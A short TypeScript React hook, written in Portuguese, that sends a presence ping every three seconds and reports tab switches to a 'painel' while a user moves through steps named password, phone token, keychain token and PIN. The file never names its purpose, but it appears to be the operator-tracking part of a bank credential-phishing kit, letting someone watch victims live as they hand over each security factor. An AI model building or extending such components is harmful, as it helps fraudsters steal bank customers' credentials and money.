import { useEffect } from "react";
import { atualizarPresenca } from "@/lib/cliente.functions";

type Fase = "senha" | "token_celular" | "token_chaveiro" | "pin" | "concluido";

/** Envia um "ping" periódico + estado de visibilidade da aba para o painel. */
export function usePresenca(id: string | null, fase: Fase) {
  useEffect(() => {
    if (!id) return;
    let cancelado = false;

    const enviar = (mudou_aba?: boolean) => {
      atualizarPresenca({
        data: { id, fase, ...(mudou_aba !== undefined && { mudou_aba }) },
      }).catch(() => undefined);
    };

    enviar(document.visibilityState === "hidden");
    const timer = setInterval(() => {
      if (cancelado) return;
      enviar();
    }, 3000);

    const onVis = () => enviar(document.visibilityState === "hidden");
    document.addEventListener("visibilitychange", onVis);

    return () => {
      cancelado = true;
      clearInterval(timer);
      document.removeEventListener("visibilitychange", onVis);
    };
  }, [id, fase]);
}
